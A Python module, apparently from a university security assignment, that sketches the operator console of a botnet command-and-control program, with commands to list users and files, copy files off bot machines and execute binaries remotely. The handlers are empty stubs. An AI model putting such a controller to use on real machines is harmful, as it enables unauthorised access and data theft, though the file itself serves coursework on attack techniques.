import enum

from common.dataclasses.commands import CommandTypes
from master.src.dataclasses.context import is_running


class InputCommandTypes(enum.Enum):
    HELP = "help"
    W = "w"
    LS = "ls"
    ID = "id"
    COPY = "copy"
    EXEC = "exec"
    EXIT = "exit"


class InputStates(enum.Enum):
    COMMAND_SELECT = 0
    BOT_SELECT = 1


__input_state: InputStates = InputStates.COMMAND_SELECT


def __print_hello_message() -> None:
    print("Welcome to master program of BSY winter assigment. Type 'help' for help. Type 'exit' for exit.")
    print("Here are commands executable on bots:")
    for command in CommandTypes:
        print(command.value)


def __print_help() -> None:
    print("Here is quick summary of what program does and which commands can you use and what they do:")
    print(
        "This is master program of BSY winter assigment. It servers as commander for bots distributed on other computers.")
    print(
        "To use this program in first step insert your command with parameter you wish, that they would run with separated with space.")
    print(
        "For instance write: ls .. to list parent directory. Then pick bot on which should command run by selecting his index number")
    print("Here is quick summary of what commands can you run on the bots:")
    print("- 'help' for help.")
    print("- 'w' for list users which are logged in on bot computer. Does not take parameter")
    print(
        "- 'ls' for list files and directories on specified path. If path is not specified, then lists current directory")
    print("- 'id' for retrieving id of current user on bot computer. Does not take parameter")
    print(
        "- 'copy' to copy file from remote computer to this computer. Files can be found in directory copied_files. Takes path to required file")
    print("- 'exec' to execute binary on remote computer. Takes param command which will be executed")
    print("- 'exit' to exit")


def __handle_user_command_input() -> None:
    pass


def __handle_bot_select_input() -> None:
    pass


def handle_user_input() -> None:
    __print_hello_message()
    while is_running():
        if __input_state == InputStates.COMMAND_SELECT:
            __handle_user_command_input()
        elif __input_state == InputStates.BOT_SELECT:
            __handle_bot_select_input()
